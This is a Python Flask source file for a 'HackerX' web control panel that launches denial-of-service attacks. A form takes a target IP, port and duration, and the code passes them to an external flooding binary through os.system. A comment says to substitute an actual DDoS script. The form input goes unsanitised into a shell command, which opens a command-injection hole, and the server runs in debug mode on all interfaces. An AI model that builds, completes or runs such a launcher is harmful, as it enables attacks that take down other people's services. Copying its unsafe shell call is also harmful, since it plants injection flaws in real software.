from flask import Flask, render_template, request, redirect, url_for
import os
import time

app = Flask(__name__)

launched = False
duration = 0
current_target = {}

@app.route('/', methods=['GET', 'POST'])
def index():
    global launched, duration, current_target

    if request.method == 'POST':
        action = request.form.get('action')

        if action == 'launch':
            ip = request.form.get('ip')
            port = request.form.get('port')
            duration = int(request.form.get('duration'))

            current_target = {
                'ip': ip,
                'port': port,
                'duration': duration
            }

            launched = True

            print(f"\n🚀 Attack Started")
            print(f"🌐 Target IP: {ip}")
            print(f"🔌 Port     : {port}")
            print(f"⏱ Duration : {duration} sec")
            print("📡 Running ./runner script...")

            # ⚠️ Replace with actual DDoS script path or command
            os.system(f"timeout {duration} ./Alonepapa {ip} {port} {duration} &")

            time.sleep(1)

        elif action == 'reset':
            print("\n⛔ Attack Reset")
            launched = False
            duration = 0
            current_target = {}

        return redirect(url_for('index'))

    return render_template('index.html', launched=launched, duration=duration)

if __name__ == '__main__':
    print("💻 HackerX Web Control Panel running at http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)